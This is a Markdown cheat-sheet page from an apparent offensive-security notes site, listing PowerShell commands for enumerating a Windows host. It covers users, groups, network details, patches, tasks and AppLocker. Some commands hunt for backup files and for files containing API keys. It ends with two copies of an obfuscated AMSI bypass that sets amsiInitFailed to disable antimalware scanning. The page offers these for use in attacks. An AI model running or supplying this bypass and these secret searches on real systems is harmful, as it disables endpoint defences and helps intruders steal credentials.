---
title: "PowerShell"
description: "Enumeration methods using only PowerShell."
lead: "Enumeration of the domain, users, groups, and computers using only PowerShell."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 10
toc: true
---

## Users

```powershell
# Show local users
Get-LocalUser

# Show number of local users
Get-LocalUser | Measure-Object -line

# Get user by providing SID
Get-LocalUser -SID "S-1-5-21-1394777289-3961777894-1791813945-501"

# Show usernames and SIDs
Get-LocalUser | Select-Object -Property Name,SID,Enabled

# Show users that do not require a password
Get-LocalUser | Where-Object -Property PasswordRequired -Eq $False
```

## Groups

```powershell
# Show local groups
Get-LocalGroup

# Show number of local groups
Get-LocalGroup | Measure-Object -line
```

## Networks

```powershell
# Get network adapter and IP address information
Get-NetIPAddress

# Show only IPv4 addresses and show output in table format
Get-NetIPAddress -AddressFamily IPv4 | Format-Table
Get-NetIPAddress -AddressFamily IPv4 | ft

# Show listening ports
Get-NetTCPConnection -State Listen
```

## Computers & Files

```powershell
# Show installed patches
Get-HotFix

# Show informatio about specific patch
Get-HotFix -ID KB4023834

# Search for backup files
Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force
gci -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force
ls -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force

# Search files containing specific string
Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY

# Get running processes
Get-Process

# Get all scheduled tasks
Get-ScheduledTask

# Get information about specific scheduled task
Get-ScheduledTask -TaskName "new-sched-task"

# Show owner of file/folder
Get-ACL C:\

# Language mode
$ExecutionContext.SessionState.LanguageMode

# AppLocker policy
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# AMSI bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
